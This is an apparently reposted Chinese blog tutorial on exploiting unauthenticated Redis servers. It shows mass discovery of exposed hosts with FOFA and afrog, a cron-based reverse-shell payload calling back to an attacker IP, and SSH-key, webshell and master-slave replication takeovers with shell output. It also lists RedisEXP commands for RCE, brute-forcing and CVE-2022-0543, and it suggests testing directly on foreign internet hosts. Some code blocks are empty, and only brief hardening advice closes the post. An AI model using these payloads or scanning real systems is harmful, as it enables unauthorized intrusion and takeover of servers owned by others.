#  Redis未授权漏洞复现汇总  
网安探索员  网安探索员   2025-06-10 12:00  
  
原文链接:  
  
https://www.freebuf.com/articles/web/433079.html  
## Redis介绍  
> Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：  
> 基于内存运行，性能高效支持分布式，理论上可以无限扩展key-value存储系统开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。  
> 目前guthub/twitter/微博/阿里/美团/百度等大厂都在使用Redis，Redis 的应用场景包括：缓存系统（“热点”数据：高频读、低频写）、计数器、消息队列系统、排行榜、社交网络和实时系统。  
  
## redis常用指令以及配置文件介绍  
> 1.redis-cli -h ip -p 6379 -a passwd   # 外部连接,Redis 的连接除了通过指定 IP，也可以通过指定域名  
> 2.info # 查看相关redis信息  
> 3.set xz "Hacker"                     # 设置键xz的值为字符串Hacker  
> 4.get xz                              # 获取键xz的内容  
> 5.INCR score                          # 使用INCR命令将score的值增加1  
> 6.keys *                              # 列出当前数据库中所有的键  
> 7.config set protected-mode no        # 关闭安全模式  
> 8.get anotherkey                      # 获取一个不存在的键的值  
> 9.config set dir /root/redis          # 设置保存目录  
> 10.config set dbfilename redis.rdb     # 设置保存文件名  
> 11.config get dir                      # 查看保存目录  
> 12.config get dbfilename               # 查看保存文件名  
> 13.save                                # 进行一次备份操作  
> 14.flushall                            # 删除所有数据  
> 15.del key                             # 删除键为key的数据  
> 16.slaveof ip port    # 设置主从关系  
>   
> 17.127.0.0.1:6379> mset k1 v1 k2 v2 k3 v3   #批量设置键值对  
> OK  
>   
> 18.127.0.0.1:6379> mget k1 k2 k3 #批量获取键值对  
> 1) "v1"  
> 2) "v2"  
> 3) "v3"  
> 使用SET和GET命令，可以完成基本的赋值和取值操作；  
> Redis是不区分命令的大小写的，set和SET是同一个意思；  
> 使用keys *可以列出当前数据库中的所有键；  
> 当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)；  
> 如果键的值中有空格，需要使用双引号括起来，如"Hello World";  
  
### redis.conf配置文件参数  
> port参数：  
格式为port后面接端口号，如port 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。  
> bind参数：  
格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如bind 192.168.47.173 10.0.0.1，表允许192.168.47.173和10.0.0.1两个IP连接。如果设置为0.0.0.0则表示任意ip都可连接，说白了就是白名单。  
> save参数：  
格式为save <秒数> <变化数>，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个save参数，如：  
save 900 1  
save 300 10  
save 60 10000  
表示如果数据库的内容在60秒后产生了10000次改变，或者300秒后产生了10次改变，或者900秒后产生了1次改变，那么立即进行备份操作。  
> requirepass参数：  
格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。  
> dir参数：  
格式为dir后接指定的路径，默认为dir ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。  
> dbfilename参数：  
格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename dump.rdb，即备份文件的名字为dump.rdb。  
> config命令：  
通过config命令可以读取和设置dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command CONFIG HTCMD，可以将CONFIG命令重命名为HTCMD。配置文件默认是没有对CONFIG命令进行重命名操作的。  
> protected-mode参数：  
redis3.2之后添加了protected-mode安全模式，默认值为yes，开启后禁止外部连接，所以在测试时，先在配置中修改为no。  
  
## Redis未授权访问漏洞介绍  
> **Redis**  
默认情况下，会绑定在 **0.0.0.0:6379**  
，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。  
> 攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的**config 命令**  
，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 **/root/.ssh**  
文件夹的**authotrized_keys**  
文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。  
  
## Redis常见getshell漏洞汇总  
  
![1748612154_6839b43ab0c1e53e3915d.png!small?1748612154174](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKW0k8hod6YVuy4IGnnAsEwibHibc7B5Vv0R0BDCaKNMHkVQAcbibwNBmKQw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
## Redis资产获取  
> 这里我使用fofa进行举例，还可以使用hunter,quark,zoomeye之类的工具，语法都是大同小异。  
>   
> fofa语法：  
> protocol="redis"  
> port="6379"  
> app="reds"  
> 也可以三个一起用，结果更加精准。  
> protocol="redis"&&port="6379"&&app="redis"  
> 如果攻防之类的有特定要求  
> 可以使用city,is_domain,等条件进一步缩小范围。  
  
  
![1748612724_6839b674155b307f484b4.png!small?1748612735185](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWvJnMv2Yia3MUC6C85XUvglss28RBq7jeuDxXibp0lChetpg96htv1GcQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![1748612724_6839b67413b10dc88cc48.png!small?1748612735185](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWudaXNcVJZZp6GlekG1rHfVVRDtbkkUfcQvfRYXricn3uGp04eJGS0jQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![1748613602_6839b9e2248a4e3070a1a.png!small?1748613609343](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWskxtDIOJ6x3kUmDGnIuqGfI5W5OEk4rg1EdXiaTcn8LwnyORCvjn13Q/640?wx_fmt=jpeg&from=appmsg "")  
> 当然很多情况我们没有会员无法进行导出，所以可以从海鲜平台花个十几块，每个工具的key进行导出测试，比如使用fofa_view等工具。  
  
  
![1748612844_6839b6ec74ef23e300bfd.png!small?1748612843773](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWz4pUaADVBHknhiau0eT8Vs3ln1GSWXaSXX8zWeudEIM1VCx04vZA0qw/640?wx_fmt=jpeg&from=appmsg "")  
> fofa_view工具进行资产导出  
  
  
![1748612936_6839b748bcdb4327e1489.png!small?1748612936296](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKW3DSoJYkgeviaRaejsk6qYRG4Mlyw4UNBL9ib0kXQejLEzVrpvEperrqw/640?wx_fmt=jpeg&from=appmsg "")  
> 导出测试就可以。  
  
  
## Redis漏洞发现  
> 我推荐使用afrog进行测试,将得到的资产保存到redis.txt里面  
> 语法：  
> afrog -s redis -pl #进行查看确实有poc  
  
  
![1748613052_6839b7bc7f2b198f18cf1.png!small?1748613051702](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWDQxBQcenUPhDfvxvn78huYuUiaMpP8LGibtdacA6G8a9aRJ3ogsCgBDw/640?wx_fmt=jpeg&from=appmsg "")  
  
> 使用这个语法进行测试,结果保存到，reids.html  
>   
> afrog -s redis -T redis.txt  -S high -o redis.html  
>   
> -s 指定poc  
> -T 指定redis资产文件  
> -o 报错结果  
> -S 指定威胁等级  
  
  
![1748613458_6839b952dfbee28f6fe28.png!small?1748613465580](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWU9dkibNTC1tlkHXojeIBkLvKmBT3dgyugPxtTfj7ibe6nicsKicxRMZKqA/640?wx_fmt=jpeg&from=appmsg "")  
> 一般工具的误报很低很低。  
  
  
![1748613522_6839b992c601b8dbc0c4d.png!small?1748613522120](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWuk99f58UFuRENEjmaVzj1ehZESicExiaoLRhQKfhqa8VicI1VsRRLjZFg/640?wx_fmt=jpeg&from=appmsg "")  
> 之后结果查看确实可以未授权看到redis数据库里面的内容。  
  
## 复现环境搭建  
  
redis服务器安装  
> 靶机:centos7  
wget https://download.redis.io/releases/redis-4.0.10.tar.gz//下载redis压缩包  
tar -zxvfredis-4.0.10.tar.gz//解压我们下载的压缩包  
> cd redis-4.0.10/src//然后进入redis的src目录下  
然后进行编译安装  
make  
make install  
> 如果报错就先装gcc-c++,之后在操作  
> [root@bogon redis-4.0.6]#  yum install gcc-c++         yum安装gcc  
> [root@bogon redis-4.0.6]# make distclean      清空上次编译失败残留文件  
> [root@bogon redis-4.0.6]# make && make install    执行编译及安装  
>   
> 之后进行配置  
>   
> vim打开redis.conf文件，然后找到daemonize 值改为yes（后台启动，不然窗口一关服务就挂了）  
bind 127.0.0.1注释掉，否则只允许本地访问  
> requirepass yourpassword可以设置密码  
protected-mode no  
启动redis服务：需要两个文件 redis-server redis.conf(注意这两个并不是在同一级目录，根据自己当前所在目录进行调用)  
>   
> redis.conf 在redis的一级目录下面  
redis-server 在src目录下面  
>   
  
  
安装redis客户端  
> 攻击机：kali  
get https://download.redis.io/releases/redis-7.0.0.tar.gz  
tar -zxf redis-7.0.0.tar.gz  
cd redis-7.0.0  
make  
cp src/redis-cli /usr/bin  
> // 测试连接  
redis-cli -h your_host -p 6379 -a "pass" --raw  
-h: 远程连接的主机  
-p: 远程连接的端口  
-a: 密码  
--raw：解决中文乱码。  
  
  
**注：测试的时候如果出现redis客户端一直连不上的情况，在靶机上执行了以下命令，客户端就可以连接上了。**  
> iptables -F  
setenforce 0  
systemctl stop firewalld.service  
> iptables -F：  
> 该命令用来清除（flush）所有现有的 iptables 防火墙规则。iptables 是 Linux 中的包过滤工具，负责管理网络流量的过滤和路由。执行这个命令后，所有已设置的防火墙规则都会被清空，网络流量将不再受到任何过滤。  
setenforce 0：  
> 这个命令用于设置 SELinux（Security-Enhanced Linux）模式为宽松模式（Permissive）。在 SELinux 的宽松模式下，SELinux 仍然会记录违规事件，但不会阻止或限制任何操作。相比之下，如果设置为强制模式（setenforce 1），SELinux 会严格执行安全策略，拒绝所有不符合规则的操作。  
systemctl stop firewalld.service：  
> 该命令用于停止 firewalld 服务。firewalld 是一个基于区域的防火墙管理工具，提供了一种更灵活和动态的防火墙管理方式。执行该命令后，firewalld 防火墙会被停止，从而停止所有通过 firewalld 管理的防火墙规则。  
  
### 如果环境有问题可以自行百度或者直接从资产里拿国外的直接进行测试即可。  
## 未授权利用计划任务反弹shell  
  
**漏洞原理**  
  
利用Redis未授权漏洞，可以通过写入文件到系统计划任务目录 **/var/spool/cron/crontabs**  
下来执行；(/crontabskali系统下的计划任务文件夹。）  
  
**漏洞复现**  
  
在kali上建立起nc监听。  
> nv -lvvp 2333  
  
  
之后使用  
> redis-cli -h 192.168.138.128 # 未授权访问redis服务  
>   
> 192.168.136.169:6379> set xxx "\n\n * * * * * bash -i >& /dev/tcp/192.168.136.128/2333 0>&1 \n\n"  
OK # /添加名为xxx的key，值为后面反弹shell的语句,5个星号代表每分钟执行一次，其中的\n同样是为了换行，避免crontab的语法错误。这里你也可以去不加\n，去看看乱码，踩个坑才能印象深刻  
192.168.136.169:6379> config set dir /var/spool/cron/  
OK # 设置路径  
192.168.136.169:6379> config set dbfilename root  
OK # 设置文件名  
192.168.136.169:6379> save  
OK # 保存key值到文件中  
192.168.136.169:6379>  
>   
> 之后过一会  
>   
> ──(root㉿kali)-[~/桌面]  
└─# nc -lvvp 2333  
listening on [any] 2333 ...  
192.168.136.169: inverse host lookup failed: Unknown host  
connect to [192.168.136.128] from (UNKNOWN) [192.168.136.169] 52438  
bash: 此 shell 中无任务控制  
[root@localhost ~]# ls  
ls  
anaconda-ks.cfg  
ElectricRat-docker  
ElectricRat-docker.zip  
initial-setup-ks.cfg  
redis-4.0.10  
redis-4.0.10.tar.gz  
公共  
模板  
视频  
图片  
文档  
下载  
音乐  
桌面  
[root@localhost ~]#  
  
## 利用redis写ssh公钥实现ssh登录  
  
**漏洞原理**  
  
在数据库中插入一条数据，将本机的**公钥**  
作为value，key值，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。  
  
**利用条件：**  
  
redis对外开放，且是未授权访问状态，并且redis服务ssh对外开放，可以通过key登入。  
  
**利用过程**  
  
确保CentOS 7 ssh服务开启着：  
> 查看ssh服务状态  
systemctl status sshd.service  
  
  
尝试使用Kali远程连接ssh：ssh root@192.168.1.8，可以看到需要登密码。  
  
![1748614418_6839bd12db74c9d8beec9.png!small?1748614418237](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWBPAiclLAialO7bmoMFMzWWYebzKPO07T87icV7eHvribh5HdyXFyMib1pcg/640?wx_fmt=jpeg&from=appmsg "")  
  
攻击机(Kali)上创建**ssh-rsa**  
密钥，也就是生成key，这里什么也不输入，连续回车三次。  
```
```  
  
Your public key has been saved in /root/.ssh/id_rsa.pub  
  
可以看到生成的公钥已将保存到/root/.ssh/id_rsa.pub路径下，输入ls -al /root/.ssh/命令可以看到保存的公钥文件。  
  
  
将公钥导入**key.txt**  
，（前后用\n换行，避免和redis里其他缓存数据混合，是用于防止乱码）；  
```
```  
  
ls -al /root/.ssh/可以查看生成的key.txt文件，使用cat /root/.ssh/key.txt查看密钥内容。  
  
  
Kali通过redis的未授权访问漏洞，将key.txt生成的公钥写入靶机服务器的内存之中：  
```
```  
  
**-x**  
代表从标准输入读取数据作为该命令的最后一个参数。  
  
Kali通过redis远程登陆，输入key *，查看crack，输入get crack查看公钥内容。  
  
![1748614444_6839bd2c2087b305deaf7.png!small?1748614443511](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWg0reSlBGVafFOtYqxy1WMcmAQ8icHg8Noaon7Gf46LBvibDejmEBYb5Q/640?wx_fmt=jpeg&from=appmsg "")  
  
设置路径和保存的文件名，将内存变量导入磁盘文件。  
```
```  
  
注意：这里报错(error) ERR Changing directory: No such file or directory的意思是靶机没有这个文件目录， 原因是.ssh 是记录密码信息的文件夹，如果没有用root用户登录过的话，就没有 .ssh 文件夹，所以我们在靶机上执行下面这条命令（mkdir /root/.ssh）手动创建.ssh目录。  
  
  
靶机(CentOS 7)可以执行cat /root/.ssh/authorized_keys查看公钥已经成功导入；此时，在攻击机(Kali)这里用ssh连接靶机，可成功连接。  
```
```  
  
ifconfig查看ssh成功连接。  
> ──(root㉿kali)-[~/.ssh]  
└─# ssh -i id_rsa root@192.168.1.8  
Last login: Thu May 23 15:18:56 2024 from 192.168.1.8  
[root@localhost ~]#   
然后直接接管服务器了  
  
## 利用redis写入Webshell  
  
**利用条件：**  
- 服务器开着web服务  
  
- redis有web目录写权限，可以往web路径写入文件  
  
**复现过程：**  
  
在攻击机Kali上未授权访问Redis。  
```
```  
  
通过redis-cli向apache的/var/www/html目录下写webshell文件，并使用蚁剑连接。  
```
```  
  
访问192.168.1.8/shell.php使webshell脚本生效，再使用蚁剑连接。  
  
![1748614581_6839bdb5b41e03ddfe6b3.png!small?1748614581169](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWgITbf9aGUDClt3ia08163sAgzHWYb7hvgzXhjlMDCkNn1kYEiaUJDwrA/640?wx_fmt=jpeg&from=appmsg "")  
  
## Redis主从复制 GetShell  
## 漏洞原理  
  
漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。  
  
在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意.so文件，即可执行命令。  
## 利用条件  
- 影响版本：Redis 4.x/5.x (<= 5.0.5)  
  
- 漏洞类型：RCE  
  
- 利用条件：未授权或者弱口令外网访问redis 服务  
  
## 漏洞复现  
  
**直接使用攻击即可：**  
Awsome-Redis-Rogue-Server  
  
下载地址：https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server  
  
利用工具反弹shell：可以执行一下语句进行反弹shell。  
```
```  
  
--rhost [靶机] --lhost [黑客攻击]，运行时可能存在编码错误，将.py文件改为gbk编码。  
  
注意：脚本运行的时候，有两种模式【i】交互式，也就是命令行；【r】反弹shell。  
  
反弹shell:  
  
![1748614663_6839be07d56c87f28c4e1.png!small?1748614663271](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKW67Gh4ibqKtO5gibDicxYu3iasX36FlolzeOpibhWSn1DrmdicgC9zjpNtrPw/640?wx_fmt=jpeg&from=appmsg "")  
  
交互模式：  
  
![1748614678_6839be16ecab4b8cce3e9.png!small?1748614678391](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKW8rwLZ372oqCm1GP2FWBTsDh0LZCawFTbze4N4xZvG662MYuxWCKGdg/640?wx_fmt=jpeg&from=appmsg "")  
  
这部分的缺点就是只适用于目标机器**允许远程登录**  
的时候，如果目标机子只允许本地登录，则这种利用方法就不行了，此时可以配合其他漏洞，从目标本地登录redis。  
## redis自动测试工具推荐  
## RedisEXP  
> 基本连接:   
RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456  
> 执行Redis命令：  
RedisExp.exe -m cli -r 192.168.19.1 -p 6379 -w 123456 -c info  
> 加载dll或so执行命令：  
RedisExp.exe -m load -r 目标IP -p 目标端口 -w 密码 -rf (目标 dll | so 文件名)  
RedisEXP.exe -m load -r 127.0.0.1 -p 6379 -rf exp.dll -n system -t system.exec  
> 主从复制命令执行：  
RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名[exp.dll | exp.so (Linux)]  
RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -c whoami  
RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -c whoami -rf exp.so  
> 主从复制上传文件：  
RedisExp.exe -m upload -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -rp 目标路径 -rf 目标文件名 -lf 本地文件  
RedisEXP.exe -m upload -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 2222 -rp . -rf 1.txt -lf .\README.md  
> 主动关闭主从复制：  
RedisExp.exe -m close -r 目标IP -p 目标端口 -w 密码  
> 写计划任务：  
RedisExp.exe -m cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort  
RedisEXP.exe -m cron -r 192.168.1.8 -p 6379 -L 192.168.1.8 -P 9001  
> 写SSH 公钥：  
RedisExp.exe -m ssh -r 目标IP -p 目标端口 -w 密码 -u 用户名 -s 公钥  
RedisEXP.exe -m ssh -r 192.168.1.8 -p 6379 -u root -s ssh-aaaaaaaaaaaaaa  
> 写webshell：  
RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容 [base64内容使用 -b 来解码]  
RedisEXP.exe -m shell -r 127.0.0.1 -p 6379 -rp . -rf shell.txt -s MTIzNA== -b  
> CVE-2022-0543：  
RedisExp.exe -m cve -r 目标IP -p 目标端口 -w 密码 -c 执行命令  
> 爆破Redis密码：  
RedisExp.exe -m brute -r 目标IP -p 目标端口 -f 密码字典  
RedisEXP.exe -m brute -r 127.0.0.1 -p 6378 -f pass.txt  
> 生成gohper：  
RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件  
> 执行 bgsave：  
RedisExp.exe -m bgsave -r 目标IP -p 目标端口 -w 密码  
> 判断文件（需要绝对路径）：  
RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf c:\windows\win.ini  
  
  
redis未授权检测  
  
基本连接  
> .\RedisEXP.exe -r 123.58.224.8 -p 38798  
  
  
![1748614797_6839be8d8bfc9683653d2.png!small?1748614796936](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kt3YUvjTnSurmGHXIuIvwKWGqfk0rEdQblP7iasXrbsWMevrI717fgzEjeeakpBJGTOIDNiaNTZuuyg/640?wx_fmt=jpeg&from=appmsg "")  
  
## redis未授权访问漏洞防护建议  
> 将redis版本升级到4.x/5.05或以上；将redis的默认端口号6379修改为其他端口号并避免redis端口暴露在公网；设置密码认证（一般为空），可以免密码远程登陆redis服务；利用防火墙对访问redis服务器的流量进行检测拦截；绑定内网ip地址进行访问。  
  
  
  
  
  
  
  
  
  
